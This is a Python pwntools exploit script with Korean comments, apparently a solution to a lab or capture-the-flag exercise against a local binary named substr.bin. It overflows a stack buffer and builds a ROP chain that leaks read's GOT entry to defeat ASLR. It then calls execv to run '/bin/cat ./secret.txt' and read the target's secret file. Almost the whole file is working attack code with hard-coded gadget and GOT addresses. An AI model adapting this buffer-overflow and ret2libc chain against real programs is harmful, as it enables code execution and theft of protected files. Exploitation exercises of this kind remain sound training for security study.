#!/usr/bin/python3

from pwn import *

def exploit():
    # Write your exploit logic here.
    p = process("./substr.bin")

    # Caution: Note that the gadget for %rsi contains two "pop" instructions.
    rop = ROP("./substr.bin")
    print(rop.rdi)
    print(rop.rsi)
    print(rop.rdx)
    print(rop.ret)

    # You can investigate the offset of libc functions as follow.
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    execv_offset = libc.symbols['execv']
    read_offset = libc.symbols['read']
    puts_offset = libc.symbols['puts']
    print("Offset of execv() within libc library: 0x%x" % execv_offset)
    print("Offset of read() within libc library: 0x%x" %read_offset)
    print("Offset of puts() within libc library: 0x%x" %puts_offset)

    rdi_gadget = p64(0x401333)
    rsi_gadget = p64(0x401331)
    ret_gadget = p64(0x40101a)

    read_plt = p64(0x401070)
    read_got = p64(0x404038)

    write_plt = p64(0x401040)
    write_got = p64(0x404020)

    puts_plt = p64(0x401030)
    puts_got = p64(0x404018)
    
    # puts(msg).
    print(p.recvline())

    print(p.recvuntil(b"slice: "))
    p.sendline(b"A")

    print(p.recvuntil(b"extract with: "))
    
    # read() 실제 주소 획득.
    # puts(read@got)
    payload = b"A" * 0x48
    payload += rdi_gadget
    payload += read_got
    payload += puts_plt
    payload += p64(0x401186) # 다시 main() 함수의 시작지점으로 돌아가기 위해.

    p.sendline(payload)

    read_addr = p.recvline()[:-1]
    origin_len = len(read_addr)
    additional_len = 8 - origin_len
    read_addr = read_addr + b"\x00" * additional_len

    read_addr = u64(read_addr)
    base_addr = read_addr - read_offset
    execv_addr = base_addr + execv_offset
    
    # 다시 main() 함수의 시작 지점으로 돌아올 것임.
    
    # puts(msg).
    print(p.recvline())
    
    # execv에 필요한 인자들을 전역변수 gbuf에 쌓음.
    print(p.recvuntil(b"slice: "))
    p.sendline(b"/bin/cat" + b"\x00" + b"\x00" * 0x7 + b"./secret.txt" + b"\x00" + b"A" * 0x3 + p64(0x4040e0) + p64(0x4040f0) + p64(0x0))

    print(p.recvuntil(b"extract with: "))

    # execv("/bin/cat", argv);
    payload2 = b"A" * 0x48
    payload2 += rsi_gadget
    payload2 += p64(0x404100) # argv의 시작주소인 0x404100.
    payload2 += p64(0x4142) # 쓰레기 값.
    payload2 += rdi_gadget # ret처리할 때, rdi_gadget으로 가기 위함.
    payload2 += p64(0x4040e0) # "/bin/cat"의 시작주소.
    payload2 += p64(execv_addr) # ret처리할 때, execv 함수의 실제 주소로 가기 위함.

    p.sendline(payload2)
    
    # 정답 결과물을 받기 위해.
    print(p.recvline())

if __name__ == "__main__":
    exploit()
